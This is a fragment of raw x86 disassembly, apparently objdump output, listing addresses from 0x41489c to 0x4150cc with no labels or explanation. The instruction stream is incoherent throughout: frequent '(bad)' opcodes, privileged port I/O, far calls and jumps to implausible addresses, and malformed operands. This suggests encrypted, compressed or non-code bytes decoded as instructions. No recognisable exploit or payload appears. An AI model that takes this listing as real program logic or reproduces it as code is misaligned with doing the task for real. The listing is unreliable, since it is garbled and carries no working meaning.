  41489c:	and    eax,DWORD PTR [ecx-0x42]
  41489f:	imul   ebx,DWORD PTR [ebx],0xa
  4148a2:	bnd jns 0x414871
  4148a5:	(bad)
  4148a9:	sbb    al,0x8c
  4148ab:	xchg   ebp,eax
  4148ac:	fmul   QWORD PTR [esi-0x4b950f9c]
  4148b2:	sbb    eax,0x4d8b0d45
  4148b7:	mov    ecx,0x54a5694b
  4148bc:	sub    eax,0x2fc1b0bb
  4148c1:	inc    esp
  4148c2:	add    ah,BYTE PTR [edi]
  4148c4:	ficomp DWORD PTR [ebp-0x1e]
  4148c7:	add    al,0x8b
  4148c9:	cmp    al,BYTE PTR [eax+0x7d99027b]
  4148cf:	sbb    eax,0xbce02e30
  4148d4:	and    DWORD PTR [eax],esp
  4148d6:	inc    ecx
  4148d7:	inc    esi
  4148d8:	jnp    0x414886
  4148da:	add    ebp,0x1a
  4148dd:	rcl    DWORD PTR [ebx],1
  4148df:	addr16 push cs
  4148e1:	rcr    BYTE PTR [ecx+0x74],1
  4148e4:	cmp    DWORD PTR [esi+0x69803910],ebx
  4148ea:	push   edi
  4148eb:	fnstsw WORD PTR [edi]
  4148ed:	adc    eax,0x360b7967
  4148f2:	(bad)  
  4148f4:	jecxz  0x41488e
  4148f6:	cmp    ebx,eax
  4148f8:	add    edx,edx
  4148fa:	rcl    BYTE PTR [edx+0x56],1
  4148fd:	cs aad 0xea
  414900:	setp   BYTE PTR [esi+0x3e]
  414904:	ds stos BYTE PTR es:[edi],al
  414906:	push   esp
  414907:	sti    
  414908:	rcl    bl,1
  41490a:	retf   0x1432
  41490d:	sti    
  41490e:	(bad)  
  41490f:	mov    dl,0x1f
  414911:	into   
  414912:	jp     0x414961
  414914:	int3   
  414915:	leave  
  414916:	daa    
  414917:	(bad)  
  414918:	out    0x69,eax
  41491a:	icebp  
  41491b:	mov    ch,0xe5
  41491d:	mov    dh,0x21
  41491f:	ja     0x4148f6
  414921:	test   edx,0x9897b5c8
  414927:	ret    
  414928:	in     al,dx
  414929:	dec    edx
  41492a:	add    al,0x3e
  41492c:	test   al,0x49
  41492f:	ins    DWORD PTR es:[edi],dx
  414930:	fs mov ss,esp
  414933:	daa    
  414934:	xor    eax,0x424e54b0
  414939:	lock cdq 
  41493b:	(bad)
  41493e:	mov    ebx,0x3f4e5417
  414943:	dec    ebx
  414944:	data16 fwait
  414946:	clc    
  414947:	jmp    0x93d7e29d
  41494c:	ins    DWORD PTR es:[edi],dx
  41494d:	rcr    DWORD PTR [ecx-0x7a134171],0xee
  414954:	adc    al,0xd1
  414956:	es nop
  414958:	je     0x414970
  41495a:	call   0xf140:0x9a53dfa0
  414961:	sbb    al,0xd8
  414963:	adc    eax,0xeb091349
  414968:	pop    eax
  414969:	mov    bh,0xda
  41496b:	push   ss
  41496c:	xchg   edi,eax
  41496d:	stos   DWORD PTR es:[edi],eax
  41496e:	clc    
  41496f:	dec    ebx
  414970:	inc    esi
  414971:	leave  
  414972:	sti    
  414973:	test   BYTE PTR [eax+0x0],al
  414976:	mov    cl,0xc8
  414978:	rcl    DWORD PTR [ecx],cl
  41497a:	xor    BYTE PTR [ebx-0x62bf7138],cl
  414980:	sbb    DWORD PTR [esi+esi*1+0x2bd5f74c],edi
  414987:	jnp    0x414980
  414989:	dec    edi
  41498a:	daa    
  41498b:	fxch   st(7)
  41498d:	push   0x16a2b778
  414992:	xchg   ecx,eax
  414993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414994:	shl    DWORD PTR [edi+0x49e65c14],0x99
  41499b:	xor    ebx,DWORD PTR [eax+0x6]
  41499e:	shl    DWORD PTR [ecx-0xa2dad29],0xa5
  4149a5:	sub    bh,ch
  4149a7:	int3   
  4149a8:	mov    WORD PTR [esi],gs
  4149aa:	rcl    edi,cl
  4149ac:	aaa    
  4149ad:	add    bl,BYTE PTR [edx]
  4149af:	fcom   st(2)
  4149b1:	jb     0x4149c5
  4149b3:	pop    ecx
  4149b4:	sbb    al,0xf1
  4149b6:	shl    DWORD PTR ds:0xf918739b,1
  4149bc:	sti    
  4149bd:	mov    dh,0xdf
  4149bf:	cs mov edx,0x889da1c0
  4149c5:	cmp    edi,DWORD PTR [ebx-0x6a9d384f]
  4149cb:	inc    ecx
  4149cc:	sbb    al,0x20
  4149ce:	neg    dh
  4149d0:	ficomp DWORD PTR [edi-0x4893c2bc]
  4149d6:	sbb    BYTE PTR [edi],ah
  4149d8:	dec    esi
  4149d9:	push   esi
  4149da:	cmp    al,0xdd
  4149dc:	or     edx,DWORD PTR [ebx]
  4149de:	daa    
  4149df:	arpl   cx,bp
  4149e1:	loope  0x41496a
  4149e3:	outs   dx,BYTE PTR ds:[esi]
  4149e4:	sub    bx,WORD PTR [ebp+ebp*2-0x56badaf6]
  4149ec:	jge    0x414a02
  4149ee:	ds or  al,0xfc
  4149f1:	inc    esi
  4149f2:	mov    ebp,0x3196a7d8
  4149f7:	jp     0x4149c9
  4149f9:	out    0xfe,eax
  4149fb:	mov    edx,0x4a76b8c0
  414a00:	repnz fwait
  414a02:	ror    BYTE PTR [eax],1
  414a04:	push   0x35
  414a06:	cmc    
  414a07:	lods   eax,DWORD PTR ds:[esi]
  414a08:	lds    esi,FWORD PTR [edx-0xc8cbe10]
  414a0e:	cmp    al,bh
  414a10:	pop    ecx
  414a11:	xchg   ecx,eax
  414a12:	outs   dx,DWORD PTR ds:[esi]
  414a13:	xor    ah,BYTE PTR cs:[ebx]
  414a16:	fbstp  TBYTE PTR [eax-0x7c]
  414a19:	shl    DWORD PTR [esi],0xaf
  414a1c:	mov    ?,eax
  414a1e:	(bad)  
  414a1f:	out    dx,al
  414a20:	(bad)
  414a24:	pop    ss
  414a25:	jno    0x4149f8
  414a27:	pop    esp
  414a28:	out    dx,eax
  414a29:	xor    bh,bl
  414a2b:	pop    eax
  414a2c:	aaa    
  414a2d:	mov    DWORD PTR [ecx+0x3dad30e6],eax
  414a33:	cli    
  414a34:	les    edi,FWORD PTR [ebx+0x449c529f]
  414a3a:	cdq    
  414a3b:	ficomp DWORD PTR [eax-0x60]
  414a3e:	push   es
  414a3f:	ds xchg ebx,eax
  414a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a42:	pop    eax
  414a43:	(bad)  
  414a44:	mov    edx,0xcb4faea0
  414a49:	adc    ebp,esp
  414a4b:	xor    BYTE PTR [edx+0x906920b],bl
  414a51:	xchg   ecx,eax
  414a52:	fld    DWORD PTR [ecx]
  414a54:	mov    BYTE PTR [edi],bl
  414a56:	scas   eax,DWORD PTR es:[edi]
  414a57:	mov    cl,0x6
  414a59:	add    DWORD PTR [edi+0x1e050ac9],eax
  414a5f:	inc    esi
  414a60:	das    
  414a61:	mov    al,ds:0x1f0ffecc
  414a66:	mov    ds:0x18020ea1,eax
  414a6b:	retf   
  414a6c:	fnstcw WORD PTR [ebx+ecx*1+0x6]
  414a70:	sbb    DWORD PTR [eax+0x70dfeaa7],edx
  414a76:	dec    edx
  414a77:	inc    edi
  414a78:	push   cs
  414a79:	ret    
  414a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a7b:	arpl   WORD PTR [eax+eiz*8],cx
  414a7e:	mov    ch,0x98
  414a80:	cdq    
  414a81:	icebp  
  414a82:	inc    edx
  414a83:	neg    esi
  414a85:	push   ss
  414a86:	out    0xf1,eax
  414a88:	ins    BYTE PTR es:[edi],dx
  414a89:	inc    ebx
  414a8a:	fdiv   DWORD PTR [ebx]
  414a8c:	bound  esp,QWORD PTR [edi-0x46e2d6b5]
  414a92:	dec    edx
  414a93:	dec    ebp
  414a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a95:	xchg   ebx,eax
  414a96:	mov    dh,BYTE PTR [edi-0x177168a9]
  414a9c:	mov    cl,0x9b
  414a9e:	outs   dx,DWORD PTR ds:[esi]
  414a9f:	xchg   edx,eax
  414aa0:	pop    edx
  414aa1:	in     eax,dx
  414aa2:	and    al,0xa2
  414aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa5:	add    al,0x5b
  414aa7:	stc    
  414aa8:	jge    0x414a54
  414aaa:	retf   0x164e
  414aad:	push   cs
  414aae:	and    eax,0x47f7d705
  414ab3:	mov    ?,WORD PTR [ebx+0x507c0d70]
  414ab9:	mov    al,ds:0x746cf8d8
  414abe:	ins    DWORD PTR es:[edi],dx
  414abf:	and    ax,0x45c3
  414ac3:	fcomp  DWORD PTR [ebx+0x51]
  414ac6:	bound  ecx,QWORD PTR [ebp+0x2c]
  414ac9:	cmp    al,0x4b
  414acb:	arpl   ax,ax
  414acd:	cs iret 
  414acf:	sti    
  414ad0:	inc    ebp
  414ad1:	data16 mov BYTE PTR [edx+ecx*1+0x696391bd],al
  414ad9:	dec    esp
  414ada:	pop    ss
  414adb:	mov    ecx,DWORD PTR [eax-0x5c6974fa]
  414ae1:	mov    edi,0xdc65d106
  414ae6:	out    0xb2,al
  414ae8:	not    BYTE PTR [edx-0x1f]
  414aeb:	repz pop ecx
  414aed:	xchg   ebx,eax
  414aee:	mov    ebp,fs
  414af0:	mov    al,ds:0xef430877
  414af5:	dec    eax
  414af6:	xchg   edx,eax
  414af7:	data16 add dl,ch
  414afa:	jle    0x414ace
  414afc:	enter  0xa414,0xb8
  414b00:	lock test eax,0xa3434d31
  414b06:	mov    bl,0x55
  414b08:	and    ebx,ebx
  414b0a:	jp     0x414b4d
  414b0c:	aaa    
  414b0d:	shl    DWORD PTR [eax+0x41a87438],cl
  414b13:	mov    al,bh
  414b15:	repnz mov bh,0x53
  414b18:	retf   
  414b19:	add    DWORD PTR [esi-0x17],esi
  414b1c:	xor    bl,0xa2
  414b1f:	mov    ecx,0x2fbb2d2a
  414b24:	pop    eax
  414b25:	ss inc esi
  414b27:	out    dx,eax
  414b28:	fcmovb st,st(5)
  414b2a:	test   BYTE PTR [eax*2+0x343f2073],bl
  414b31:	imul   ebx,edi,0xfffffff1
  414b34:	loope  0x414b03
  414b36:	adc    esp,DWORD PTR [ebp+0x2e89dcba]
  414b3c:	xchg   DWORD PTR [esi+0x21],edx
  414b3f:	fist   WORD PTR [esi+edi*2]
  414b42:	test   DWORD PTR [ecx],edx
  414b44:	test   al,0x39
  414b46:	sub    al,0x3d
  414b48:	pop    es
  414b49:	popf   
  414b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b4b:	inc    edi
  414b4c:	pop    esp
  414b4d:	sbb    eax,0x60ca55b9
  414b52:	mov    dh,0x4
  414b54:	or     DWORD PTR [edi+0x7054b77d],edx
  414b5a:	(bad)  
  414b5b:	leave  
  414b5c:	neg    BYTE PTR [edi+edi*1+0x1b]
  414b60:	mov    ebp,0xeec9ba05
  414b65:	mov    ecx,0x192b9f42
  414b6a:	jnp    0x414b5c
  414b6c:	cmp    bh,BYTE PTR [eax]
  414b6e:	pop    esp
  414b6f:	je     0x414bc6
  414b71:	jnp    0x414bcb
  414b73:	and    eax,0x6d171b3e
  414b78:	push   eax
  414b79:	sbb    DWORD PTR [edx+0x41],ebx
  414b7c:	mov    eax,ds:0xaa5759c5
  414b81:	test   al,0xa5
  414b83:	mov    ah,0x5a
  414b85:	jle    0x414bca
  414b87:	gs fs pop edi
  414b8a:	outs   dx,BYTE PTR ds:[esi]
  414b8b:	test   al,0x50
  414b8d:	add    eax,0x5adfb14d
  414b92:	add    eax,0xb0ee4566
  414b97:	cmc    
  414b98:	shl    ecx,cl
  414b9a:	adc    eax,esi
  414b9c:	or     DWORD PTR fs:[edx+0x2d3107c0],esp
  414ba3:	sub    BYTE PTR [ebx-0x26],0x19
  414ba7:	(bad)  
  414ba8:	cwde   
  414ba9:	popa   
  414baa:	dec    ebx
  414bab:	fdivr  st(5),st
  414bad:	les    edi,FWORD PTR [ebp+eax*4-0x17f93903]
  414bb4:	sbb    DWORD PTR [esi+ebx*8],edi
  414bb7:	out    0xa8,eax
  414bb9:	rcl    bh,cl
  414bbb:	test   BYTE PTR [eax],0xbd
  414bbe:	add    ebp,ebx
  414bc0:	mov    ah,0x64
  414bc2:	mov    bl,0x67
  414bc4:	pop    ebx
  414bc5:	xor    DWORD PTR [ebp-0x7b8961fe],ebx
  414bcb:	pop    es
  414bcc:	cmp    al,0xb6
  414bce:	in     al,dx
  414bcf:	enter  0x5e6e,0x51
  414bd3:	sbb    esp,eax
  414bd5:	(bad)  [eax-0x54]
  414bd8:	adc    edx,DWORD PTR [eax+0x3701f2a5]
  414bde:	ja     0x414b85
  414be0:	dec    ebx
  414be1:	loop   0x414c17
  414be3:	jecxz  0x414ba5
  414be5:	adc    bl,bh
  414be7:	sub    BYTE PTR [esi+0x5180bde9],0xd7
  414bee:	xor    DWORD PTR [ecx+esi*8],esp
  414bf1:	aas    
  414bf2:	and    eax,0x81920118
  414bf7:	and    BYTE PTR [ecx-0x3f],0x6f
  414bfb:	mov    ebp,0x1bc9565c
  414c00:	aaa    
  414c01:	mov    eax,ecx
  414c03:	in     al,dx
  414c04:	out    0xed,al
  414c06:	(bad)  
  414c07:	mov    ecx,DWORD PTR [edx+eax*2]
  414c0a:	jl     0x414bc5
  414c0c:	std    
  414c0d:	or     eax,0x51e022d5
  414c12:	mov    esi,0xce96d248
  414c17:	inc    BYTE PTR [ebx]
  414c19:	fsubr  DWORD PTR [edx-0x77]
  414c1c:	addr16 push 0x8d3e9491
  414c22:	mov    edx,0x796a2377
  414c27:	sbb    al,0x7c
  414c29:	inc    esp
  414c2a:	scas   al,BYTE PTR es:[edi]
  414c2b:	lods   al,BYTE PTR ds:[esi]
  414c2c:	outs   dx,DWORD PTR ds:[esi]
  414c2d:	and    eax,0xa9cb54ae
  414c32:	adc    al,0xdf
  414c34:	out    0x98,al
  414c36:	(bad)  
  414c37:	stos   DWORD PTR es:[edi],eax
  414c38:	test   eax,0x46d0a6e9
  414c3d:	xchg   edx,eax
  414c3e:	les    edx,FWORD PTR [eax]
  414c40:	shl    BYTE PTR [edx+0x5a],cl
  414c43:	push   ds
  414c44:	int3   
  414c45:	mov    bl,0x9a
  414c47:	push   edi
  414c48:	push   ds
  414c49:	add    DWORD PTR [edi-0x27],ecx
  414c4c:	nop
  414c4d:	mov    DWORD PTR [edx-0x51],edx
  414c50:	sbb    DWORD PTR [esp-0x4d],0x78af914a
  414c58:	sbb    eax,0x40f73c02
  414c5d:	jns    0x414c4c
  414c5f:	push   ss
  414c60:	pop    ebp
  414c61:	sar    edx,cl
  414c63:	fistp  QWORD PTR [ebx]
  414c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c66:	scas   eax,DWORD PTR es:[edi]
  414c67:	mov    eax,0xd3b09159
  414c6c:	jle    0x414ca0
  414c6e:	test   DWORD PTR [esi],0xaa8f0331
  414c74:	daa    
  414c75:	cld    
  414c76:	mov    ss,edi
  414c78:	add    al,0x7e
  414c7a:	popa   
  414c7b:	xchg   ebx,eax
  414c7c:	dec    esp
  414c7d:	jmp    0xdd5f1158
  414c82:	mov    al,ds:0x61976324
  414c87:	pop    edi
  414c88:	dec    ebp
  414c89:	aam    0x55
  414c8b:	mov    ds:0xf63e7a1c,al
  414c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c91:	xlat   BYTE PTR ds:[ebx]
  414c92:	mov    bh,0x8c
  414c94:	jmp    edx
  414c96:	push   ecx
  414c97:	fucomip st,st(5)
  414c99:	add    BYTE PTR gs:[eax],al
	...
  414d14:	adc    DWORD PTR [ebp-0x1caa2],esp
  414d1a:	jnp    0x414cc1
  414d1c:	int    0xa1
  414d1e:	ficom  WORD PTR [ebx+ecx*1-0x50]
  414d22:	inc    esi
  414d23:	outs   dx,BYTE PTR ds:[esi]
  414d24:	pop    edi
  414d25:	repz add BYTE PTR [eax],al
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	pop    es
  414d2a:	add    BYTE PTR [eax],al
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	mov    al,0x6b
  414d2f:	mov    ecx,0x5538d962
  414d34:	inc    edi
  414d35:	daa    
  414d36:	shl    eax,cl
  414d38:	or     bl,BYTE PTR [edi-0x1849c001]
  414d3e:	or     bh,bl
  414d40:	jp     0x414dbd
  414d42:	mov    al,ds:0x1928fae
  414d47:	and    al,0xec
  414d49:	ins    DWORD PTR es:[edi],dx
  414d4a:	ss (bad) 
  414d4c:	retf   0x2fb1
  414d4f:	inc    ebp
  414d50:	xor    cl,BYTE PTR [edx-0x586f834a]
  414d56:	into   
  414d57:	pop    edi
  414d58:	cdq    
  414d59:	xchg   esp,eax
  414d5a:	push   ecx
  414d5c:	shl    dl,1
  414d5e:	inc    edi
  414d5f:	add    eax,0x1b481c27
  414d64:	js     0x414cf0
  414d66:	repz imul edi,ecx,0x16
  414d6a:	push   0xffffff97
  414d6c:	xor    BYTE PTR ds:0xcae8dbe4,dl
  414d72:	adc    BYTE PTR [ecx-0x3bf3c897],ch
  414d78:	push   ss
  414d79:	stc    
  414d7a:	jo     0x414d30
  414d7c:	sub    BYTE PTR [ebx-0x32258f74],ah
  414d82:	repnz and al,0x47
  414d85:	xor    al,0xf5
  414d87:	mov    eax,DWORD PTR [edx+0x676435b7]
  414d8d:	(bad)  
  414d8e:	mov    ebx,0x29fe1718
  414d93:	(bad)  
  414d94:	xor    cl,BYTE PTR [ebp-0x1a]
  414d97:	mov    edx,0x8952b082
  414d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d9d:	or     dh,BYTE PTR [esi]
  414d9f:	xchg   edi,eax
  414da0:	js     0x414d56
  414da2:	sub    edx,0x37
  414da5:	mov    ebx,0x601007d
  414daa:	bound  ebp,QWORD PTR [ebx-0xe372ef6]
  414db0:	sbb    BYTE PTR [ebx],al
  414db2:	sbb    eax,0x2a11374e
  414db7:	lods   al,BYTE PTR ds:[esi]
  414db8:	push   0xffffff8f
  414dba:	das    
  414dbb:	ds xchg ebx,eax
  414dbd:	xor    DWORD PTR [eax],esi
  414dbf:	test   eax,0x5663e7bb
  414dc4:	inc    ebp
  414dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc6:	mov    ah,0x48
  414dc8:	adc    al,0xf1
  414dca:	pop    edx
  414dcb:	pusha  
  414dcc:	jns    0x414db8
  414dce:	push   edi
  414dcf:	fisubr DWORD PTR [eax-0x72]
  414dd2:	fdivr  st(1),st
  414dd4:	imul   eax,DWORD PTR [ecx+0x39],0xec93aa85
  414ddb:	out    dx,al
  414ddc:	retf   0xc6d3
  414ddf:	lds    esi,FWORD PTR [ecx+ecx*1]
  414de2:	xor    DWORD PTR [edi+0x6d],ecx
  414de5:	call   0xf57e:0xda174e56
  414dec:	stos   BYTE PTR es:[edi],al
  414ded:	adc    al,0x42
  414def:	nop
  414df0:	sahf   
  414df1:	sahf   
  414df2:	lock xor eax,0xb5318efd
  414df8:	add    eax,DWORD PTR [esi+0x7d]
  414dfb:	push   ss
  414dfc:	and    eax,ecx
  414dfe:	popf   
  414dff:	lods   al,BYTE PTR ds:[esi]
  414e00:	sti    
  414e01:	dec    edi
  414e02:	or     bh,bh
  414e04:	sti    
  414e05:	jbe    0x414dee
  414e07:	aaa    
  414e08:	pusha  
  414e09:	xchg   DWORD PTR [ebx+0x31a5af51],esi
  414e0f:	sbb    BYTE PTR [eax+0x62cee65],bl
  414e15:	inc    edx
  414e16:	sub    BYTE PTR [esi-0x68],dl
  414e19:	cmp    al,0x6f
  414e1b:	push   ebx
  414e1c:	lds    eax,FWORD PTR [edx+0x5b01b7a7]
  414e22:	mov    ds:0xedbe0359,al
  414e27:	or     al,0xc2
  414e29:	(bad)  
  414e2a:	std    
  414e2b:	push   esp
  414e2c:	cdq    
  414e2d:	xchg   BYTE PTR [ecx+0x6a],bh
  414e30:	hlt    
  414e31:	pop    ebx
  414e32:	xchg   BYTE PTR [ebp-0x3f],dl
  414e35:	adc    al,BYTE PTR [ebx+0x15af8766]
  414e3b:	pop    ecx
  414e3c:	push   0xb88e822c
  414e41:	and    eax,0x2dbc0114
  414e46:	inc    eax
  414e47:	jmp    0xd637457
  414e4c:	mov    esp,DWORD PTR [eax-0x4702af24]
  414e52:	mov    ch,0xc
  414e54:	adc    bl,BYTE PTR [ecx-0x6d]
  414e57:	imul   esp,DWORD PTR ss:[edx+0x3a2b0c04],0xe855dc9e
  414e62:	fwait
  414e63:	jnp    0x414e35
  414e65:	icebp  
  414e66:	xchg   esi,eax
  414e67:	jle    0x414ee6
  414e69:	out    dx,al
  414e6a:	mov    ah,0x5e
  414e6c:	push   esi
  414e6d:	aas    
  414e6e:	dec    ebp
  414e6f:	loopne 0x414e93
  414e71:	jb     0x414e4d
  414e73:	rcr    BYTE PTR ds:0x6f29d7ca,cl
  414e79:	in     eax,dx
  414e7a:	xchg   ebp,eax
  414e7b:	sti    
  414e7c:	dec    ebx
  414e7d:	mov    bl,0x52
  414e7f:	xor    al,0x4b
  414e81:	mov    eax,0x2057b53f
  414e86:	sahf   
  414e87:	mov    al,ds:0x660cf39c
  414e8c:	jle    0x414ee3
  414e8e:	mov    esi,0xebb16f9b
  414e93:	sar    DWORD PTR [ebp+0x1247825e],cl
  414e99:	ins    DWORD PTR es:[edi],dx
  414e9a:	jl     0x414ead
  414e9c:	adc    ebx,DWORD PTR [edx]
  414e9e:	xchg   edx,eax
  414e9f:	or     DWORD PTR [edi+0x57],esp
  414ea2:	jle    0x414ee4
  414ea4:	je     0x414ef8
  414ea6:	in     eax,dx
  414ea7:	cmp    bl,bh
  414ea9:	jge    0x414ecc
  414eab:	mov    eax,ds:0xec154c2
  414eb0:	mov    bl,0xf2
  414eb2:	es push 0x662d87bc
  414eb8:	sub    esp,DWORD PTR [edi+ebx*2+0x6652aa10]
  414ebf:	sbb    BYTE PTR [edx],0x17
  414ec2:	loopne 0x414e49
  414ec4:	stos   BYTE PTR es:[edi],al
  414ec5:	sbb    DWORD PTR [edx+0x3ac0a66c],0xa9b58e1
  414ecf:	ds retf 
  414ed1:	retf   
  414ed2:	jp     0x414f1b
  414ed4:	xor    esi,DWORD PTR [eax+0x7c]
  414ed7:	mov    ch,0x9
  414ed9:	rol    esi,cl
  414edb:	popa   
  414edc:	jge    0x414e9f
  414ede:	pop    ss
  414edf:	ins    BYTE PTR es:[edi],dx
  414ee0:	adc    bl,ch
  414ee2:	xor    ah,BYTE PTR [edx-0x1d]
  414ee5:	jmp    0x8c986dc1
  414eea:	push   esi
  414eeb:	push   ss
  414eec:	mov    BYTE PTR [edi],bl
  414eee:	jmp    0x414efa
  414ef0:	mov    dh,0x2e
  414ef2:	pop    ss
  414ef3:	adc    ecx,DWORD PTR [edi+0x59ed0801]
  414ef9:	shr    DWORD PTR [edi],0x2e
  414efc:	mov    eax,0xaa733a8
  414f01:	(bad)  
  414f02:	jae    0x414ea4
  414f04:	mov    WORD PTR [esi+ebx*2-0x35dbb505],gs
  414f0b:	cs ins BYTE PTR es:[edi],dx
  414f0d:	push   esi
  414f0e:	and    si,WORD PTR [edi]
  414f11:	outs   dx,BYTE PTR ds:[esi]
  414f12:	jle    0x414f79
  414f14:	imul   esp,DWORD PTR [ecx+0x28e80af],0xffffffd4
  414f1b:	les    ecx,FWORD PTR [edx-0x27]
  414f1e:	pop    ecx
  414f1f:	int    0x44
  414f21:	in     al,dx
  414f22:	mov    esi,0xf4bfb4
  414f27:	mov    BYTE PTR [esi+0x114d132d],cl
  414f2d:	inc    eax
  414f2e:	daa    
  414f2f:	imul   ebx,DWORD PTR [eax-0x3cb0ae6a],0xffffffda
  414f36:	push   0x6eafa415
  414f3b:	push   ebx
  414f3c:	call   0x4ffc2cac
  414f41:	les    edi,FWORD PTR [ebp-0x4]
  414f44:	(bad)  
  414f46:	mov    ebx,0x4fd8fb28
  414f4b:	shr    DWORD PTR [edx-0x20],1
  414f4e:	xchg   ecx,eax
  414f4f:	jge    0x414fa9
  414f51:	imul   ebp,esi,0xe8a45fe6
  414f57:	test   BYTE PTR [ebp-0x70a102c0],0x91
  414f5e:	dec    edi
  414f5f:	or     BYTE PTR [edx-0xd],al
  414f62:	push   0xffffff9c
  414f64:	mov    WORD PTR [edi],ds
  414f66:	lahf   
  414f67:	push   eax
  414f68:	or     al,BYTE PTR [ecx+esi*2]
  414f6b:	mov    edx,0xb9b97754
  414f70:	sub    al,0xbc
  414f72:	aad    0xa0
  414f74:	adc    al,BYTE PTR [edx+0x37806df0]
  414f7a:	fiadd  DWORD PTR [esi+0x39]
  414f7d:	push   cs
  414f7e:	scas   eax,DWORD PTR es:[edi]
  414f7f:	inc    edx
  414f80:	(bad)  
  414f81:	dec    ebp
  414f82:	ror    bh,0x35
  414f85:	ret    
  414f86:	add    eax,0xd3831de9
  414f8b:	mov    ds:0x352df6a6,eax
  414f90:	lds    ecx,FWORD PTR [edi]
  414f92:	scas   al,BYTE PTR es:[edi]
  414f93:	cs xchg esi,eax
  414f95:	retf   0x2792
  414f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f99:	loop   0x414f2e
  414f9b:	mov    ebx,DWORD PTR [ebp+esi*2-0x12f688a8]
  414fa2:	xor    bl,dl
  414fa4:	es push es
  414fa6:	sbb    DWORD PTR [edx-0x77],0xbac37f2d
  414fad:	retf   0x4285
  414fb0:	aaa    
  414fb1:	cmp    DWORD PTR [esp+edi*4-0x5c],ebp
  414fb5:	mov    ebx,0xd9911d22
  414fba:	xor    cl,BYTE PTR [eax+ecx*8-0x5a92641a]
  414fc1:	test   DWORD PTR [ecx+0x60],0xd1d502b9
  414fc8:	in     eax,0xe5
  414fca:	mov    bl,0xa2
  414fcc:	dec    eax
  414fcd:	xchg   DWORD PTR [edx+0x37],ecx
  414fd0:	dec    edi
  414fd1:	(bad)  
  414fd2:	mov    ds,esp
  414fd4:	or     al,BYTE PTR ds:0x3e37d0cc
  414fda:	add    al,0x99
  414fdc:	out    dx,eax
  414fdd:	sbb    eax,0x112cdbc5
  414fe2:	jae    0x415047
  414fe4:	imul   ecx,DWORD PTR [ebx+0x516dd909],0xffffffe0
  414feb:	aad    0xa4
  414fed:	and    al,0xc4
  414fef:	in     al,0x79
  414ff1:	sbb    ecx,ebp
  414ff3:	lods   eax,DWORD PTR ds:[esi]
  414ff4:	enter  0x39d0,0x9c
  414ff8:	les    ebp,FWORD PTR [edi-0x2]
  414ffb:	nop
  414ffc:	in     al,0xf4
  414ffe:	mov    bl,0x63
  415000:	stos   DWORD PTR es:[edi],eax
  415001:	daa    
  415002:	or     esi,DWORD PTR [edx+edi*4-0x38]
  415006:	jns    0x414f8f
  415008:	scas   eax,DWORD PTR es:[edi]
  415009:	mov    ecx,0x4aa69c5c
  41500e:	out    0x3a,eax
  415010:	fdiv   QWORD PTR gs:[ebx-0x64]
  415014:	xchg   ecx,eax
  415015:	mov    ebp,0xc527e4a0
  41501a:	and    BYTE PTR [eax],ah
  41501c:	hlt    
  41501d:	jnp    0x414fff
  41501f:	lds    esi,FWORD PTR [ebx+0x3]
  415022:	push   eax
  415023:	stc    
  415024:	sbb    al,al
  415026:	outs   dx,DWORD PTR ds:[esi]
  415027:	xchg   esp,ebx
  415029:	add    esi,DWORD PTR [ebp+0x12d0d811]
  41502f:	fdiv   st(3),st
  415031:	call   0x1d76d727
  415036:	or     bl,BYTE PTR [ebp-0x13d5b781]
  41503c:	fucomi st,st(5)
  41503e:	cdq    
  41503f:	dec    ebx
  415040:	xchg   DWORD PTR [ecx],ebp
  415042:	ss push es
  415044:	(bad)  
  415045:	or     eax,0x6b27d5ef
  41504a:	xor    al,0xb1
  41504c:	and    eax,DWORD PTR [edx]
  41504e:	inc    ecx
  41504f:	ret    
  415050:	cmp    ch,BYTE PTR [esi-0x5a]
  415053:	repz or DWORD PTR cs:[esi+0xc],edx
  415058:	push   ss
  415059:	hlt    
  41505a:	lea    edi,[esi]
  41505c:	rol    BYTE PTR [eax],1
  41505e:	mov    esi,0xc88eaf18
  415063:	(bad)  
  415064:	sub    eax,0x5b7375e0
  415069:	rcr    DWORD PTR [ecx],1
  41506b:	cdq    
  41506c:	sub    DWORD PTR ds:0xf118954a,esp
  415072:	mov    esi,DWORD PTR ds:0x90a7ad6c
  415078:	stos   DWORD PTR es:[edi],eax
  415079:	mov    ecx,0x51f626d4
  41507e:	aam    0xf3
  415080:	dec    ebp
  415081:	push   eax
  415082:	jb     0x4150f0
  415084:	add    DWORD PTR [esi],eax
  415086:	(bad)  
  415087:	jne    0x4150f1
  415089:	sub    ah,BYTE PTR [eax+0x73]
  41508c:	stc    
  41508d:	or     bh,BYTE PTR [ecx-0x6b0324c7]
  415093:	mov    dh,0xc6
  415095:	mov    al,ds:0xd39825d8
  41509a:	cld    
  41509b:	aas    
  41509c:	xlat   BYTE PTR ds:[ebx]
  41509d:	xlat   BYTE PTR ds:[ebx]
  41509e:	pop    esp
  41509f:	or     BYTE PTR [edx+ebx*2-0x2cfafa2f],dl
  4150a6:	imul   edi,DWORD PTR [edi-0x4a7561f1],0xffffffba
  4150ad:	pop    ss
  4150ae:	push   es
  4150af:	sbb    DWORD PTR [edi],edx
  4150b1:	retf   
  4150b2:	in     eax,0x68
  4150b4:	push   ds
  4150b5:	sub    dh,BYTE PTR [esi+0x13]
  4150b8:	(bad)  
  4150b9:	jno    0x41513a
  4150bb:	jg     0x41509c
  4150bd:	fmulp  st(7),st
  4150bf:	lock stos DWORD PTR es:[edi],eax
  4150c1:	xchg   edi,eax
  4150c2:	inc    edi
  4150c3:	test   DWORD PTR [edx-0x4a],esi
  4150c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c7:	fadd   QWORD PTR [ebx+0x2a]
  4150ca:	je     0x41507c
  4150cc:	pop    es
